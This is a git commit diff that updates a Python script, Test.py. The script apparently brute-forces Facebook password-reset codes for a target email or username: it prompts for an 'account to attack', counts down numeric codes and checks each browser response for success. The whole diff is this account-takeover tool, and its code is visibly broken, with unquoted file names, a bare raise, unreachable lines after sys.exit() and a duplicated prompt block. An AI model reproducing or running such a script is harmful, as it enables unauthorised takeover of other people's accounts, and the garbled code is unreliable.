cf6d672d1d5a1023a2979973ead2deea686ce839
krarktel112 <krarktel@gmail.com>
2024-09-11 11:59:29 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -171,7 +171,7 @@ def fb_hack(email, codex):
       fail = (y, "failed")
       success = (y, "succeded")
       s = " "
-      reset = reset - 1
+      reset -= 1
       reset1 = reset
       with open("passcoder.txt", "a") as z:
         z.write(str(reset1))
@@ -203,8 +203,8 @@ def fb_hack(email, codex):
       fail = (y, "failed")
       success = (y, "succeded")
       s = " "
-      reset1 = reset - 1
-      reset = reset1
+      reset -= 1
+      reset1 = reset
       with open(passcoder.txt, "a") as z:
         z.write(str(reset1))
         z.close()
@@ -224,18 +224,52 @@ def fb_hack(email, codex):
         else:
           print(s.join(success))
   else:
+    with open(passcoder.txt, "r") as z:
+      reset = z.readlines(-1)
+      z.close()
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     print(browser.geturl())
     if soup.find(string="password_new") == test:
-      print("Password not found")
-      browser.close()
-    else:
+      print("Passcode not found")
+      raise
+    elif soup.find(string="password_new") != test:
       print("Passcode found!")
       print(y)
       browser.close()
       reset = int(-1)
   return reset in reset1, y in passcoder, browser
+
+os.system('clear')
+ehack = input('Email address or username to attack:')
+reset = int(input('Code: ') or 99999999)
+reset1 = reset
+f = open("emails.txt", "a")
+z = open("passcoder.txt", "a")
+f.write(ehack)
+f.close()
+z.write(str(reset1))
+z.close()
+
+while True:
+  try:
+    fb_hack(ehack, reset)
+    reset = reset1
+    if int(reset1) < int(0):
+      break
+    else:
+      reset = reset1
+  except:
+    sys.exit()
+    with open(emails.txt, "r") as f:
+      ehack = f.readlines(-1)
+      f.close()
+    with open(passcoder.txt, "r") as f:
+      reset = int(z.readlines(-1))
+      z.close()
+    print("Restarting")
+    sleepy(30)
+    fb_hack(ehack, reset)
 
 os.system('clear')
 ehack = input('Email address or username to attack:')
